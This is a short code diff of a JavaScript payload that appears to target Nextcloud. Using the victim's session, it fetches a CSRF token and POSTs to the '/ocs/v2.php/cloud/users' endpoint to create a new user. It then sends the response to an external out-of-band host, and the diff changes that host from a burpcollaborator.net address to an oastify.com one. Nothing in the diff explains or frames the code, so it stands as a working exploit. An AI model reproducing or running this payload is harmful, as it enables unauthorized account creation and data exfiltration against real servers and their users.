@@ -40,13 +40,12 @@ function makeRequest( opts ) {
   makeRequest({ url: '/index.php/csrftoken'} )
   .then(function (data) {
     console.log(data);
-    token = JSON.parse(data)["token"];
     console.log("Creating new user");
     return makeRequest( { 
       method: 'POST', 
       url:'/ocs/v2.php/cloud/users', 
       headers: {
-        "requesttoken":token,
+        "requesttoken":JSON.parse(data)['token'],
         "Content-Type": "application/json",
         "Accept": "application/json, text/plain, */*"
       },
@@ -66,9 +65,10 @@ function makeRequest( opts ) {
   .then(function (data){
     return makeRequest( { 
       method: 'POST',
-      url: 'http://o1qywh01mp97vfjghcngnkgp0g66uv.burpcollaborator.net',
+      url: 'http://c9meitwb0ims1ywc9lt4kmobg2mtaky9.oastify.com',
       data: data
     });
   });
 
 })();
+
